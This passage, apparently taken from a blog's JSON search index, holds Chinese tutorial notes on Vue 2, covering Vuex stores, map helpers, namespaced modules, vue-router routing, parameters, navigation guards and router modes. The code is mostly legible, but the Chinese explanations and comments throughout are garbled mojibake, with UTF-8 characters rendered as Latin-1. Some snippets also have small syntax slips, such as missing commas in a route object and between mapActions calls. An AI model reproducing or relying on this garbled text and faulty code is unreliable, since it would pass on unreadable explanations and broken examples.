//å¼•å…¥store import store from './store' ...... //åˆ›å»ºvm new Vue({ el:'#app', render: h =&gt; h(App), store }) 4.åŸºæœ¬ä½¿ç”¨ åˆå§‹åŒ–æ•°æ®ã€é…ç½®actionsã€é…ç½®mutationsï¼Œæ“ä½œæ–‡ä»¶store.js //å¼•å…¥Vueæ ¸å¿ƒåº“ import Vue from 'vue' //å¼•å…¥Vuex import Vuex from 'vuex' //å¼•ç”¨Vuex Vue.use(Vuex) const actions = { //å“åº”ç»„ä»¶ä¸­åŠ çš„åŠ¨ä½œ jia(context,value){ // console.log('actionsä¸­çš„jiaè¢«è°ƒç”¨äº†',miniStore,value) context.commit('JIA',value) }, } const mutations = { //æ‰§è¡ŒåŠ  JIA(state,value){ // console.log('mutationsä¸­çš„JIAè¢«è°ƒç”¨äº†',state,value) state.sum += value } } //åˆå§‹åŒ–æ•°æ® const state = { sum:0 } //åˆ›å»ºå¹¶æš´éœ²store export default new Vuex.Store({ actions, mutations, state, }) ç»„ä»¶ä¸­è¯»å–vuexä¸­çš„æ•°æ®ï¼š$store.state.sum ç»„ä»¶ä¸­ä¿®æ”¹vuexä¸­çš„æ•°æ®ï¼š$store.dispatch('actionä¸­çš„æ–¹æ³•å',æ•°æ®) æˆ– $store.commit('mutationsä¸­çš„æ–¹æ³•å',æ•°æ®) å¤‡æ³¨ï¼šè‹¥æ²¡æœ‰ç½‘ç»œè¯·æ±‚æˆ–å…¶ä»–ä¸šåŠ¡é€»è¾‘ï¼Œç»„ä»¶ä¸­ä¹Ÿå¯ä»¥è¶Šè¿‡actionsï¼Œå³ä¸å†™dispatchï¼Œç›´æ¥ç¼–å†™commit 5.gettersçš„ä½¿ç”¨ æ¦‚å¿µï¼šå½“stateä¸­çš„æ•°æ®éœ€è¦ç»è¿‡åŠ å·¥åå†ä½¿ç”¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨gettersåŠ å·¥ã€‚ åœ¨store.jsä¸­è¿½åŠ gettersé…ç½® ...... const getters = { bigSum(state){ return state.sum * 10 } } //åˆ›å»ºå¹¶æš´éœ²store export default new Vuex.Store({ ...... getters }) ç»„ä»¶ä¸­è¯»å–æ•°æ®ï¼š$store.getters.bigSum 6.å››ä¸ªmapæ–¹æ³•çš„ä½¿ç”¨ mapStateæ–¹æ³•ï¼šç”¨äºå¸®åŠ©æˆ‘ä»¬æ˜ å°„stateä¸­çš„æ•°æ®ä¸ºè®¡ç®—å±æ€§ computed: { //å€ŸåŠ©mapStateç”Ÿæˆè®¡ç®—å±æ€§ï¼šsumã€schoolã€subjectï¼ˆå¯¹è±¡å†™æ³•ï¼‰ ...mapState({sum:'sum',school:'school',subject:'subject'}), //å€ŸåŠ©mapStateç”Ÿæˆè®¡ç®—å±æ€§ï¼šsumã€schoolã€subjectï¼ˆæ•°ç»„å†™æ³•ï¼‰ ...mapState(['sum','school','subject']), }, mapGettersæ–¹æ³•ï¼šç”¨äºå¸®åŠ©æˆ‘ä»¬æ˜ å°„gettersä¸­çš„æ•°æ®ä¸ºè®¡ç®—å±æ€§ computed: { //å€ŸåŠ©mapGettersç”Ÿæˆè®¡ç®—å±æ€§ï¼šbigSumï¼ˆå¯¹è±¡å†™æ³•ï¼‰ ...mapGetters({bigSum:'bigSum'}), //å€ŸåŠ©mapGettersç”Ÿæˆè®¡ç®—å±æ€§ï¼šbigSumï¼ˆæ•°ç»„å†™æ³•ï¼‰ ...mapGetters(['bigSum']) }, mapActionsæ–¹æ³•ï¼šç”¨äºå¸®åŠ©æˆ‘ä»¬ç”Ÿæˆä¸actionså¯¹è¯çš„æ–¹æ³•ï¼Œå³ï¼šåŒ…å«$store.dispatch(xxx)çš„å‡½æ•° methods:{ //é mapActionsç”Ÿæˆï¼šincrementOddã€incrementWaitï¼ˆå¯¹è±¡å½¢å¼ï¼‰ ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'}) //é mapActionsç”Ÿæˆï¼šincrementOddã€incrementWaitï¼ˆæ•°ç»„å½¢å¼ï¼‰ ...mapActions(['jiaOdd','jiaWait']) } mapMutationsæ–¹æ³•ï¼šç”¨äºå¸®åŠ©æˆ‘ä»¬ç”Ÿæˆä¸mutationså¯¹è¯çš„æ–¹æ³•ï¼Œå³ï¼šåŒ…å«$store.commit(xxx)çš„å‡½æ•° methods:{ //é mapActionsç”Ÿæˆï¼šincrementã€decrementï¼ˆå¯¹è±¡å½¢å¼ï¼‰ ...mapMutations({increment:'JIA',decrement:'JIAN'}), //é mapMutationsç”Ÿæˆï¼šJIAã€JIANï¼ˆå¯¹è±¡å½¢å¼ï¼‰ ...mapMutations(['JIA','JIAN']), } å¤‡æ³¨ï¼šmapActionsä¸mapMutationsä½¿ç”¨æ—¶ï¼Œè‹¥éœ€è¦ä¼ é€’å‚æ•°éœ€è¦ï¼šåœ¨æ¨¡æ¿ä¸­ç»‘å®šäº‹ä»¶æ—¶ä¼ é€’å¥½å‚æ•°ï¼Œå¦åˆ™å‚æ•°æ˜¯äº‹ä»¶å¯¹è±¡ã€‚ 7.æ¨¡å—åŒ–+å‘½åç©ºé—´ ç›®çš„ï¼šè®©ä»£ç æ›´å¥½ç»´æŠ¤ï¼Œè®©å¤šç§æ•°æ®åˆ†ç±»æ›´åŠ æ˜ç¡®ã€‚ ä¿®æ”¹store.js const countAbout = { namespaced:true,//å¼€å¯å‘½åç©ºé—´ state:{x:1}, mutations: { ... }, actions: { ... }, getters: { bigSum(state){ return state.sum * 10 } } } const personAbout = { namespaced:true,//å¼€å¯å‘½åç©ºé—´ state:{ ... }, mutations: { ... }, actions: { ... } } const store = new Vuex.Store({ modules: { countAbout, personAbout } }) å¼€å¯å‘½åç©ºé—´åï¼Œç»„ä»¶ä¸­è¯»å–stateæ•°æ®ï¼š //æ–¹å¼ä¸€ï¼šè‡ªå·±ç›´æ¥è¯»å– this.$store.state.personAbout.list //æ–¹å¼äºŒï¼šå€ŸåŠ©mapStateè¯»å–ï¼š ...mapState('countAbout',['sum','school','subject']), å¼€å¯å‘½åç©ºé—´åï¼Œç»„ä»¶ä¸­è¯»å–gettersæ•°æ®ï¼š //æ–¹å¼ä¸€ï¼šè‡ªå·±ç›´æ¥è¯»å– this.$store.getters['personAbout/firstPersonName'] //æ–¹å¼äºŒï¼šå€ŸåŠ©mapGettersè¯»å–ï¼š ...mapGetters('countAbout',['bigSum']) å¼€å¯å‘½åç©ºé—´åï¼Œç»„ä»¶ä¸­è°ƒç”¨dispatch //æ–¹å¼ä¸€ï¼šè‡ªå·±ç›´æ¥dispatch this.$store.dispatch('personAbout/addPersonWang',person) //æ–¹å¼äºŒï¼šå€ŸåŠ©mapActionsï¼š ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'}) å¼€å¯å‘½åç©ºé—´åï¼Œç»„ä»¶ä¸­è°ƒç”¨commit //æ–¹å¼ä¸€ï¼šè‡ªå·±ç›´æ¥commit this.$store.commit('personAbout/ADD_PERSON',person) //æ–¹å¼äºŒï¼šå€ŸåŠ©mapMutationsï¼š ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}), è·¯ç”± ç†è§£ï¼š ä¸€ä¸ªè·¯ç”±ï¼ˆrouteï¼‰å°±æ˜¯ä¸€ç»„æ˜ å°„å…³ç³»ï¼ˆkey - valueï¼‰ï¼Œå¤šä¸ªè·¯ç”±éœ€è¦è·¯ç”±å™¨ï¼ˆrouterï¼‰è¿›è¡Œç®¡ç†ã€‚ å‰ç«¯è·¯ç”±ï¼škeyæ˜¯è·¯å¾„ï¼Œvalueæ˜¯ç»„ä»¶ã€‚ 1.åŸºæœ¬ä½¿ç”¨ å®‰è£…vue-routerï¼Œå‘½ä»¤ï¼šnpm i vue-router åº”ç”¨æ’ä»¶ï¼šVue.use(VueRouter) ç¼–å†™routeré…ç½®é¡¹: //å¼•å…¥VueRouter import VueRouter from 'vue-router' //å¼•å…¥Luyou ç»„ä»¶ import About from '../components/About' import Home from '../components/Home' //åˆ›å»ºrouterå®ä¾‹å¯¹è±¡ï¼Œå»ç®¡ç†ä¸€ç»„ä¸€ç»„çš„è·¯ç”±è§„åˆ™ const router = new VueRouter({ routes:[ { path:'/about', component:About }, { path:'/home', component:Home } ] }) //æš´éœ²router export default router å®ç°åˆ‡æ¢ï¼ˆactive-classå¯é…ç½®é«˜äº®æ ·å¼ï¼‰ &lt;router-link active-class=\"active\" to=\"/about\"&gt;About&lt;/router-link&gt; æŒ‡å®šå±•ç¤ºä½ç½® &lt;router-view&gt;&lt;/router-view&gt; 2.å‡ ä¸ªæ³¨æ„ç‚¹ è·¯ç”±ç»„ä»¶é€šå¸¸å­˜æ”¾åœ¨pagesæ–‡ä»¶å¤¹ï¼Œä¸€èˆ¬ç»„ä»¶é€šå¸¸å­˜æ”¾åœ¨componentsæ–‡ä»¶å¤¹ã€‚ é€šè¿‡åˆ‡æ¢ï¼Œâ€œéšè—â€äº†çš„è·¯ç”±ç»„ä»¶ï¼Œé»˜è®¤æ˜¯è¢«é”€æ¯æ‰çš„ï¼Œéœ€è¦çš„æ—¶å€™å†å»æŒ‚è½½ã€‚ æ¯ä¸ªç»„ä»¶éƒ½æœ‰è‡ªå·±çš„$routeå±æ€§ï¼Œé‡Œé¢å­˜å‚¨ç€è‡ªå·±çš„è·¯ç”±ä¿¡æ¯ã€‚ æ•´ä¸ªåº”ç”¨åªæœ‰ä¸€ä¸ªrouterï¼Œå¯ä»¥é€šè¿‡ç»„ä»¶çš„$routerå±æ€§è·å–åˆ°ã€‚ 3.å¤šçº§è·¯ç”±ï¼ˆå¤šçº§è·¯ç”±ï¼‰ é…ç½®è·¯ç”±è§„åˆ™ï¼Œä½¿ç”¨childrené…ç½®é¡¹ï¼š routes:[ { path:'/about', component:About, }, { path:'/home', component:Home, children:[ //é€šè¿‡childrené…ç½®å­çº§è·¯ç”± { path:'news', //æ­¤å¤„ä¸€å®šä¸è¦å†™ï¼š/news component:News }, { path:'message',//æ­¤å¤„ä¸€å®šä¸è¦å†™ï¼š/message component:Message } ] } ] è·³è½¬ï¼ˆè¦å†™å®Œæ•´è·¯å¾„ï¼‰ï¼š &lt;router-link to=\"/home/news\"&gt;News&lt;/router-link&gt; 4.è·¯ç”±çš„queryå‚æ•° ä¼ é€’å‚æ•° &lt;!-- è·³è½¬å¹¶æºå¸¦queryå‚æ•°ï¼Œtoçš„å­—ç¬¦ä¸²å†™æ³• --&gt; &lt;router-link :to=\"/home/message/detail?id=666&amp;title=ä½ å¥½\"&gt;è·³è½¬&lt;/router-link&gt; &lt;!-- è·³è½¬å¹¶æºå¸¦queryå‚æ•°ï¼Œtoçš„å¯¹è±¡å†™æ³• --&gt; &lt;router-link :to=\"{ path:'/home/message/detail', query:{ id:666, title:'ä½ å¥½' } }\" &gt;è·³è½¬&lt;/router-link&gt; æ¥æ”¶å‚æ•°ï¼š $route.query.id $route.query.title 5.å‘½åè·¯ç”± ä½œç”¨ï¼šå¯ä»¥ç®€åŒ–è·¯ç”±çš„è·³è½¬ã€‚ å¦‚ä½•ä½¿ç”¨ ç»™è·¯ç”±å‘½åï¼š { path:'/demo', component:Demo, children:[ { path:'test', component:Test, children:[ { name:'hello' //ç»™è·¯ç”±å‘½å path:'welcome', component:Hello, } ] } ] } ç®€åŒ–è·³è½¬ï¼š &lt;!--ç®€åŒ–å‰ï¼Œéœ€è¦å†™å®Œæ•´çš„è·¯å¾„ --&gt; &lt;router-link to=\"/demo/test/welcome\"&gt;è·³è½¬&lt;/router-link&gt; &lt;!--ç®€åŒ–åï¼Œç›´æ¥é€šè¿‡åå­—è·³è½¬ --&gt; &lt;router-link :to=\"{name:'hello'}\"&gt;è·³è½¬&lt;/router-link&gt; &lt;!--ç®€åŒ–å†™æ³•é…åˆä¼ é€’å‚æ•° --&gt; &lt;router-link :to=\"{ name:'hello', query:{ id:666, title:'ä½ å¥½' } }\" &gt;è·³è½¬&lt;/router-link&gt; 6.è·¯ç”±çš„paramså‚æ•° é…ç½®è·¯ç”±ï¼Œå£°æ˜æ¥æ”¶paramså‚æ•° { path:'/home', component:Home, children:[ { path:'news', component:News }, { component:Message, children:[ { name:'xiangqing', path:'detail/:id/:title', //ä½¿ç”¨å ä½ç¬¦å£°æ˜æ¥æ”¶paramså‚æ•° component:Detail } ] } ] } ä¼ é€’å‚æ•° &lt;!-- è·³è½¬å¹¶æºå¸¦paramså‚æ•°ï¼Œtoçš„å­—ç¬¦ä¸²å†™æ³• --&gt; &lt;router-link :to=\"/home/message/detail/666/ä½ å¥½\"&gt;è·³è½¬&lt;/router-link&gt; &lt;!-- è·³è½¬å¹¶æºå¸¦paramså‚æ•°ï¼Œtoçš„å¯¹è±¡å†™æ³• --&gt; &lt;router-link :to=\"{ name:'xiangqing', params:{ id:666, title:'ä½ å¥½' } }\" &gt;è·³è½¬&lt;/router-link&gt; ç‰¹åˆ«æ³¨æ„ï¼šè·¯ç”±æºå¸¦paramså‚æ•°æ—¶ï¼Œè‹¥ä½¿ç”¨toçš„å¯¹è±¡å†™æ³•ï¼Œåˆ™ä¸èƒ½ä½¿ç”¨pathé…ç½®é¡¹ï¼Œå¿…é¡»ä½¿ç”¨nameé…ç½®ï¼ æ¥æ”¶å‚æ•°ï¼š $route.params.id $route.params.title 7.è·¯ç”±çš„propsé…ç½®â€‹ ä½œç”¨ï¼šè®©è·¯ç”±ç»„ä»¶æ›´æ–¹ä¾¿çš„æ”¶åˆ°å‚æ•° { name:'xiangqing', path:'detail/:id', component:Detail, //ç¬¬ä¸€ç§å†™æ³•ï¼špropså€¼ä¸ºå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸­æ‰€æœ‰çš„key-valueçš„ç»„åˆæœ€ç»ˆéƒ½ä¼šé€šè¿‡propsä¼ ç»™Detailç»„ä»¶ // props:{a:900} //ç¬¬äºŒç§å†™æ³•ï¼špropså€¼ä¸ºå¸ƒå°”å€¼ï¼Œå¸ƒå°”å€¼ä¸ºtrueï¼Œåˆ™æŠŠè·¯ç”±æ”¶åˆ°çš„æ‰€æœ‰paramså‚æ•°é€šè¿‡propsä¼ ç»™Detailç»„ä»¶ // props:true //ç¬¬ä¸‰ç§å†™æ³•ï¼špropså€¼ä¸ºå‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›çš„å¯¹è±¡ä¸­æ¯ä¸€ç»„key-valueéƒ½ä¼šé€šè¿‡propsä¼ ç»™Detailç»„ä»¶ props(route){ return { id:route.query.id, title:route.query.title } } } 8.&lt;router-link&gt;çš„replaceå±æ€§ ä½œç”¨ï¼šæ§åˆ¶è·¯ç”±è·³è½¬æ—¶æ“ä½œæµè§ˆå™¨å†å²è®°å½•çš„æ¨¡å¼ æµè§ˆå™¨çš„å†å²è®°å½•æœ‰ä¸¤ç§å†™å…¥æ–¹å¼ï¼šåˆ†åˆ«ä¸ºpushå’Œreplaceï¼Œpushæ˜¯è¿½åŠ å†å²è®°å½•ï¼Œreplaceæ˜¯æ›¿æ¢å½“å‰è®°å½•ã€‚è·¯ç”±è·³è½¬æ—¶å€™é»˜è®¤ä¸ºpush å¦‚ä½•å¼€å¯replaceæ¨¡å¼ï¼š&lt;router-link replace .......&gt;News&lt;/router-link&gt; 9.ç¼–ç¨‹å¼è·¯ç”±å¯¼èˆª ä½œç”¨ï¼šä¸å€ŸåŠ©&lt;router-link&gt; å®ç°è·¯ç”±è·³è½¬ï¼Œè®©è·¯ç”±è·³è½¬æ›´åŠ çµæ´» å…·ä½“ç¼–ç ï¼š //$routerçš„ä¸¤ä¸ªAPI this.$router.push({ name:'xiangqing', params:{ id:xxx, title:xxx } }) this.$router.replace({ name:'xiangqing', params:{ id:xxx, title:xxx } }) this.$router.forward() //å‰è¿› this.$router.back() //åé€€ this.$router.go() //å¯å‰è¿›ä¹Ÿå¯åé€€ 10.ç¼“å­˜è·¯ç”±ç»„ä»¶ ä½œç”¨ï¼šè®©ä¸å±•ç¤ºçš„è·¯ç”±ç»„ä»¶ä¿æŒæŒ‚è½½ï¼Œä¸è¢«é”€æ¯ã€‚ å…·ä½“ç¼–ç ï¼š &lt;keep-alive include=\"News\"&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/keep-alive&gt; 11.ä¸¤ä¸ªæ–°çš„ç”Ÿå‘½å‘¨æœŸé’©å­ ä½œç”¨ï¼šè·¯ç”±ç»„ä»¶æ‰€ç‹¬æœ‰çš„ä¸¤ä¸ªé’©å­ï¼Œç”¨äºæ•è·è·¯ç”±ç»„ä»¶çš„æ¿€æ´»çŠ¶æ€ã€‚ å…·ä½“åå­—ï¼š activatedè·¯ç”±ç»„ä»¶è¢«æ¿€æ´»æ—¶è§¦å‘ã€‚ deactivatedè·¯ç”±ç»„ä»¶å¤±æ´»æ—¶è§¦å‘ã€‚ 12.è·¯ç”±å®ˆå« ä½œç”¨ï¼šå¯¹è·¯ç”±è¿›è¡Œæƒé™æ§åˆ¶ åˆ†ç±»ï¼šå…¨å±€å®ˆå«ã€ç‹¬äº«å®ˆå«ã€ç»„ä»¶å†…å®ˆå« å…¨å±€å®ˆå«: //å…¨å±€å‰ç½®å®ˆå«ï¼šåˆå§‹åŒ–æ—¶æ‰§è¡Œã€æ¯æ¬¡è·¯ç”±åˆ‡æ¢å‰æ‰§è¡Œ router.beforeEach((to,from,next)=&gt;{ console.log('beforeEach',to,from) if(to.meta.isAuth){ //åˆ¤æ–­å½“å‰è·¯ç”±æ˜¯å¦éœ€è¦è¿›è¡Œæƒé™æ§åˆ¶ if(localStorage.getItem('school') === 'atguigu'){ //æƒé™æ§åˆ¶çš„å…·ä½“è§„åˆ™ next() //æ”¾è¡Œ }else{ alert('æš‚æ— æƒé™æŸ¥çœ‹') // next({name:'guanyu'}) } }else{ next() //æ”¾è¡Œ } }) //å…¨å±€åç½®å®ˆå«ï¼šåˆå§‹åŒ–æ—¶æ‰§è¡Œã€æ¯æ¬¡è·¯ç”±åˆ‡æ¢åæ‰§è¡Œ router.afterEach((to,from)=&gt;{ console.log('afterEach',to,from) if(to.meta.title){ document.title = to.meta.title //ä¿®æ”¹ç½‘é¡µçš„title }else{ document.title = 'vue_test' } }) ç‹¬äº«å®ˆå«: beforeEnter(to,from,next){ console.log('beforeEnter',to,from) if(to.meta.isAuth){ //åˆ¤æ–­å½“å‰è·¯ç”±æ˜¯å¦éœ€è¦è¿›è¡Œæƒé™æ§åˆ¶ if(localStorage.getItem('school') === 'atguigu'){ next() }else{ alert('æš‚æ— æƒé™æŸ¥çœ‹') // next({name:'guanyu'}) } }else{ next() } } ç»„ä»¶å†…å®ˆå«ï¼š //è¿›å…¥å®ˆå«ï¼šé€šè¿‡è·¯ç”±è§„åˆ™ï¼Œè¿›å…¥è¯¥ç»„ä»¶æ—¶è¢«è°ƒç”¨ beforeRouteEnter (to, from, next) { }, //ç¦»å¼€å®ˆå«ï¼šé€šè¿‡è·¯ç”±è§„åˆ™ï¼Œç¦»å¼€è¯¥ç»„ä»¶æ—¶è¢«è°ƒç”¨ beforeRouteLeave (to, from, next) { } 13.è·¯ç”±å™¨çš„ä¸¤ç§å·¥ä½œæ¨¡å¼ å¯¹äºä¸€ä¸ªurlæ¥è¯´ï¼Œä»€ä¹ˆæ˜¯hashå€¼ï¼Ÿâ€”â€” #åŠå…¶åé¢çš„å†…å®¹å°±æ˜¯hashå€¼ã€‚ hashå€¼ä¸ä¼šåŒ…å«åœ¨ HTTP è¯·æ±‚ä¸­ï¼Œå³ï¼šhashå€¼ä¸ä¼šå¸¦ç»™æœåŠ¡å™¨ã€‚ hashæ¨¡å¼ï¼š åœ°å€ä¸­æ°¸è¿œå¸¦ç€#å·ï¼Œä¸ç¾è§‚ ã€‚ è‹¥ä»¥åå°†åœ°å€é€šè¿‡ç¬¬ä¸‰æ–¹æ‰‹æœºappåˆ†äº«ï¼Œè‹¥appæ ¡éªŒä¸¥æ ¼ï¼Œåˆ™åœ°å€ä¼šè¢«æ ‡è®°ä¸ºä¸åˆæ³•ã€‚ å…¼å®¹æ€§è¾ƒå¥½ã€‚ historyæ¨¡å¼ï¼š åœ°å€å¹²å‡€ï¼Œç¾è§‚ ã€‚ å…¼å®¹æ€§å’Œhashæ¨¡å¼ç›¸æ¯”ç•¥å·®ã€‚ åº”ç”¨éƒ¨ç½²ä¸Šçº¿æ—¶éœ€è¦åç«¯äººå‘˜æ”¯æŒï¼Œè§£å†³åˆ·æ–°é¡µé¢æœåŠ¡ç«¯404çš„é—®é¢˜ã€‚","categories":[{"name":"Vue","slug":"Vue","permalink":"https://serein.icu/categories/Vue/"}],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://serein.icu/tags/Vue/"}]},{"title":"Vue2åŸºç¡€çŸ¥è¯†","slug":"02-Vue2åŸºç¡€çŸ¥è¯†","date":"2022-03-14T01:00:00.000Z","updated":"2022-03-14T02:38:12.449Z","comments":true,"path":"posts/2.html","link":"","permalink":"https://serein.icu/posts/2.html","excerpt":"","text":"åŸºç¡€çŸ¥è¯†ç¯‡åˆè¯†Vue æƒ³è®©Vueå·¥ä½œï¼Œå°±å¿…é¡»åˆ›å»ºä¸€ä¸ªVueå®ä¾‹ï¼Œä¸”è¦ä¼ å…¥ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼› rootå®¹å™¨é‡Œçš„ä»£ç ä¾ç„¶ç¬¦åˆhtmlè§„èŒƒï¼Œåªä¸è¿‡æ··å…¥äº†ä¸€äº›ç‰¹æ®Šçš„Vueè¯­æ³•ï¼› rootå®¹å™¨é‡Œçš„ä»£ç è¢«ç§°ä¸ºã€Vueæ¨¡æ¿ã€‘ï¼› Vueå®ä¾‹å’Œå®¹å™¨æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼› çœŸå®å¼€å‘ä¸­åªæœ‰ä¸€ä¸ªVueå®ä¾‹ï¼Œå¹¶ä¸”ä¼šé…åˆç€ç»„ä»¶ä¸€èµ·ä½¿ç”¨ï¼› ä¸­çš„xxxè¦å†™jsè¡¨è¾¾å¼ï¼Œä¸”xxxå¯ä»¥è‡ªåŠ¨è¯»å–åˆ°dataä¸­çš„æ‰€æœ‰å±æ€§ï¼› ä¸€æ—¦dataä¸­çš„æ•°æ®å‘ç”Ÿæ”¹å˜ï¼Œé‚£ä¹ˆé¡µé¢ä¸­ç”¨åˆ°è¯¥æ•°æ®çš„åœ°æ–¹ä¹Ÿä¼šè‡ªåŠ¨æ›´æ–°ï¼› æ³¨æ„åŒºåˆ†ï¼šjsè¡¨è¾¾å¼ å’Œ jsä»£ç (è¯­å¥) è¡¨è¾¾å¼ï¼šä¸€ä¸ªè¡¨è¾¾å¼ä¼šäº§ç”Ÿä¸€ä¸ªå€¼ï¼Œå¯ä»¥æ”¾åœ¨ä»»ä½•ä¸€ä¸ªéœ€è¦å€¼çš„åœ°æ–¹ï¼š a a+b demo(1) x === y ? 'a' : 'b' jsä»£ç (è¯­å¥) if(){} for(){} Vueæ¨¡æ¿è¯­æ³•Vueæ¨¡æ¿è¯­æ³•æœ‰ä¸¤å¤§ç±»ï¼š æ’å€¼è¯­æ³•ï¼š åŠŸèƒ½ï¼šç”¨äºè§£ææ ‡ç­¾ä½“å†…å®¹ã€‚ å†™æ³•ï¼šï¼Œxxxæ˜¯jsè¡¨è¾¾å¼ï¼Œä¸”å¯ä»¥ç›´æ¥è¯»å–åˆ°dataä¸­çš„æ‰€æœ‰å±æ€§ã€‚ æŒ‡ä»¤è¯­æ³•ï¼š åŠŸèƒ½ï¼šç”¨äºè§£ææ ‡ç­¾ï¼ˆåŒ…æ‹¬ï¼šæ ‡ç­¾å±æ€§ã€æ ‡ç­¾ä½“å†…å®¹ã€ç»‘å®šäº‹ä»¶â€¦..ï¼‰ã€‚ ä¸¾ä¾‹ï¼šv-bind:href=â€xxxâ€ æˆ– ç®€å†™ä¸º :href=â€xxxâ€ï¼ŒxxxåŒæ ·è¦å†™jsè¡¨è¾¾å¼ï¼Œä¸”å¯ä»¥ç›´æ¥è¯»å–åˆ°dataä¸­çš„æ‰€æœ‰å±æ€§ã€‚ å¤‡æ³¨ï¼šVueä¸­æœ‰å¾ˆå¤šçš„æŒ‡ä»¤ï¼Œä¸”å½¢å¼éƒ½æ˜¯ï¼šv-????ï¼Œæ­¤å¤„æˆ‘ä»¬åªæ˜¯æ‹¿v-bindä¸¾ä¸ªä¾‹å­ã€‚ &lt;!-- å‡†å¤‡å¥½ä¸€ä¸ªå®¹å™¨--&gt; &lt;div id=\"root\"&gt; &lt;h1&gt;æ’å€¼è¯­æ³•&lt;/h1&gt; &lt;h3&gt;ä½ å¥½ï¼Œ{{name}}&lt;/h3&gt; &lt;hr/&gt; &lt;h1&gt;æŒ‡ä»¤è¯­æ³•&lt;/h1&gt; &lt;a v-bind:href=\"school.url.toUpperCase()\" x=\"hello\"&gt;ç‚¹æˆ‘å»{{school.name}}å­¦ä¹ 1&lt;/a&gt; &lt;a :href=\"school.url\" x=\"hello\"&gt;ç‚¹æˆ‘å»{{school.name}}å­¦ä¹ 2&lt;/a&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; Vue.config.productionTip = false //é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚ new Vue({ el:'#root', data:{ name:'Serein', school:{ name:\"Serein'blog\", url:'https://www.serein.icu', } } }) &lt;/script&gt; æ•°æ®ç»‘å®šVueä¸­æœ‰2ç§æ•°æ®ç»‘å®šçš„æ–¹å¼ï¼š å•å‘ç»‘å®š(v-bind)ï¼šæ•°æ®åªèƒ½ä»dataæµå‘é¡µé¢ã€‚ åŒå‘ç»‘å®š(v-model)ï¼šæ•°æ®ä¸ä»…èƒ½ä»dataæµå‘é¡µé¢ï¼Œè¿˜å¯ä»¥ä»é¡µé¢æµå‘dataã€‚ å¤‡æ³¨ï¼š1. åŒå‘ç»‘å®šä¸€èˆ¬éƒ½åº”ç”¨åœ¨è¡¨å•ç±»å…ƒç´ ä¸Šï¼ˆå¦‚ï¼šinputã€selectç­‰ï¼‰2. v-model:value å¯ä»¥ç®€å†™ä¸º v-modelï¼Œå› ä¸ºv-modelé»˜è®¤æ”¶é›†çš„å°±æ˜¯valueå€¼ã€‚ &lt;div id=\"root\"&gt; &lt;!-- æ™®é€šå†™æ³• --&gt; &lt;!-- å•å‘æ•°æ®ç»‘å®šï¼š&lt;input type=\"text\" v-bind:value=\"name\"&gt;&lt;br/&gt; åŒå‘æ•°æ®ç»‘å®šï¼š&lt;input type=\"text\" v-model:value=\"name\"&gt;&lt;br/&gt; --&gt; &lt;!-- ç®€å†™ --&gt; å•å‘æ•°æ®ç»‘å®šï¼š&lt;input type=\"text\" :value=\"name\"&gt;&lt;br/&gt; åŒå‘æ•°æ®ç»‘å®šï¼š&lt;input type=\"text\" v-model=\"name\"&gt;&lt;br/&gt; &lt;!-- å¦‚ä¸‹ä»£ç æ˜¯é”™è¯¯çš„ï¼Œå› ä¸ºv-modelåªèƒ½åº”ç”¨åœ¨è¡¨å•ç±»å…ƒç´ ï¼ˆè¾“å…¥ç±»å…ƒç´ ï¼‰ä¸Š --&gt; &lt;!-- &lt;h2 v-model:x=\"name\"&gt;ä½ å¥½å•Š&lt;/h2&gt; --&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; Vue.config.productionTip = false //é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚ new Vue({ el:'#root', data:{ name:'Serein' } }) &lt;/script&gt; elä¸dataçš„ä¸¤ç§å†™æ³•1. elæœ‰2ç§å†™æ³•ï¼š new Vueæ—¶å€™é…ç½®elå±æ€§ã€‚ å…ˆåˆ›å»ºVueå®ä¾‹ï¼Œéšåå†é€šè¿‡vm.$mount(â€˜#rootâ€™)æŒ‡å®šelçš„å€¼ã€‚ 2. dataæœ‰2ç§å†™æ³•ï¼š å¯¹è±¡å¼ å‡½æ•°å¼ å¦‚ä½•é€‰æ‹©ï¼šç›®å‰å“ªç§å†™æ³•éƒ½å¯ä»¥ï¼Œä»¥åå­¦ä¹ åˆ°ç»„ä»¶æ—¶ï¼Œdataå¿…é¡»ä½¿ç”¨å‡½æ•°å¼ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ 3. ä¸€ä¸ªé‡è¦çš„åŸåˆ™ï¼š ç”±Vueç®¡ç†çš„å‡½æ•°ï¼Œä¸€å®šä¸è¦å†™ç®­å¤´å‡½æ•°ï¼Œä¸€æ—¦å†™äº†ç®­å¤´å‡½æ•°ï¼Œthiså°±ä¸å†æ˜¯Vueå®ä¾‹äº†ã€‚ &lt;div id=\"root\"&gt; &lt;h1&gt;ä½ å¥½ï¼Œ{{name}}&lt;/h1&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; Vue.config.productionTip = false //é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚ //elçš„ä¸¤ç§å†™æ³• const v = new Vue({ //el:'#root', //ç¬¬ä¸€ç§å†™æ³• data:{ name:'Serein' } }) console.log(v) v.$mount('#root') //ç¬¬äºŒç§å†™æ³• //dataçš„ä¸¤ç§å†™æ³• new Vue({ el:'#root', //dataçš„ç¬¬ä¸€ç§å†™æ³•ï¼šå¯¹è±¡å¼ data:{ name:'Serein' } //dataçš„ç¬¬äºŒç§å†™æ³•ï¼šå‡½æ•°å¼ data(){ console.log('@@@',this) //æ­¤å¤„çš„thisæ˜¯Vueå®ä¾‹å¯¹è±¡ return{ name:'Serein' } } }) &lt;/script&gt; MVVMæ¨¡å‹1. Mï¼šæ¨¡å‹(Model) ï¼šdataä¸­çš„æ•°æ® 2. Vï¼šè§†å›¾(View) 